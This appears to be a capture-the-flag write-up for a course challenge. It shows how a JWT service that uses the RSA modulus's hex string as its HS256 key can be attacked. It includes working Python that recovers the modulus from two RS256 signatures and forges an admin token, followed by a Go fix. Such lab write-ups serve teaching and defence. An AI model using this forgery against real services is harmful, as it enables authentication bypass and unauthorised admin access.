---
title: "Confusion — recover the RSA modulus, then sign HS256 with it"
category: Crypto
host: confusion.is-course.ru
tags: [jwt, hs256, rsa, modulus-recovery, gcd, source-audit]
technique: "RSA modulus recovery from two signatures → HS256 key is `hex(N)`"
status: solved
---

# Confusion

## TL;DR

The service signs JWTs with **either** RS256 **or** HS256, and lets the client choose the algorithm at
signup (`algo=rsa256|hs256`). The HMAC key for HS256 is not a random secret — the source ships with the
challenge, and it is one line:

```go
hsKey = []byte(k.N.Text(16))          // the RSA modulus, as a hex *string*
```

So if we can learn `N`, we can mint an HS256 token with `admin: true`. The public key is not published,
but two RS256 signatures are enough to recover `N` — which is exactly what this challenge is about.

## The application

```go
func getClaims(value string) (jwt.MapClaims, error) {
    kf := func(t *jwt.Token) (interface{}, error) {
        switch t.Method.(type) {
        case *jwt.SigningMethodRSA:   return rsaPublicKey, nil
        case *jwt.SigningMethodHMAC:  return hsKey, nil          // <- the confusion
        default:                      return nil, fmt.Errorf("invalid algorithm: %s", t.Method.Alg())
        }
    }
    token, err := jwt.Parse(value, kf)
    ...
}
```

The key function dispatches on the *attacker-supplied* `alg` header, which is the textbook
algorithm-confusion shape. What makes it interesting is where the HMAC key comes from: `k.N.Text(16)`
is the modulus in lowercase hex, used as ASCII bytes — 512 characters for a 2048-bit key. It is not the
PEM blob, so the usual "sign HS256 with `public.pem`" recipe does **not** work here.

## Step 1 — recover the modulus from two signatures

For a PKCS#1 v1.5 RS256 signature `s` on message `m`:

```
s^e ≡ EM(m)  (mod N),      EM = 0x00 || 0x01 || 0xFF…  || 0x00 || DigestInfo(SHA-256(m))
```

so `s^e − EM(m)` is an exact multiple of `N`. Two signatures from the same key give two multiples, and
their **gcd** is `N` times a small cofactor:

```python
import gmpy2, hashlib, base64

DI = bytes.fromhex("3031300d060960864801650304020105000420")   # DigestInfo || SHA-256

def em_and_sig(tok):
    h, p, s = tok.split(".")
    digest = hashlib.sha256((h + "." + p).encode()).digest()
    T   = DI + digest
    sig = base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
    k   = len(sig)                                     # = modulus length
    EM  = b"\x00\x01" + b"\xff" * (k - 3 - len(T)) + b"\x00" + T
    return int.from_bytes(EM, "big"), int.from_bytes(sig, "big")

m1, s1 = em_and_sig(tok1)     # two signups, algo=rsa256
m2, s2 = em_and_sig(tok2)
e = 65537
g = gmpy2.gcd(gmpy2.mpz(s1)**e - m1, gmpy2.mpz(s2)**e - m2)
for p in (2, 3, 5, 7, 11, 13):                          # strip the cofactor
    while g % p == 0: g //= p
N = int(g)
assert pow(s1, e, N) == m1 and pow(s2, e, N) == m2      # 2048-bit, verified
```

Two signatures are enough; a single one would need to know `N` already. (Our first attempt failed
because we grabbed the *session* cookie of a default signup instead of a token whose header said
`RS256` — always re-derive `EM` from the token you actually hold.)

## Step 2 — forge the admin token

```python
key = format(N, "x").encode()                            # exactly `k.N.Text(16)`
hdr = {"alg": "HS256", "typ": "JWT"}
pl  = {"username": "admin", "admin": True}
h   = b64e(json.dumps(hdr, separators=(",", ":")).encode())
p   = b64e(json.dumps(pl,  separators=(",", ":")).encode())
sig = hmac.new(key, (h + "." + p).encode(), hashlib.sha256).digest()
requests.get(BASE + "/restricted", cookies={"session": h + "." + p + "." + b64e(sig)})
```

```
HTTP/1.1 200 OK
YDS{…redacted…}
```

## Why it works

* **Algorithm selection is attacker-controlled.** `jwt.Parse` with a key function that branches on
  `t.Method` trusts the header to decide *which kind of key* is used.
* **The HMAC key is derived from public-key material.** A modulus is not a secret; anyone who can
  recover or guess it (here, from signatures) can compute the HMAC.
* **The `admin` claim is the authorisation check.** No server-side session, so a self-issued claim is
  the whole gate.

## Fix

```go
token, err := jwt.ParseWithClaims(raw, &Claims{}, func(t *jwt.Token) (any, error) {
    if t.Method.Alg() != "RS256" {                 // pin one algorithm
        return nil, errors.New("unexpected signing method")
    }
    return rsaPublicKey, nil
})
```

and never derive an HMAC key from a value that is, or can be, public — use a random 32-byte secret
from a secret manager, separate from the signing key.
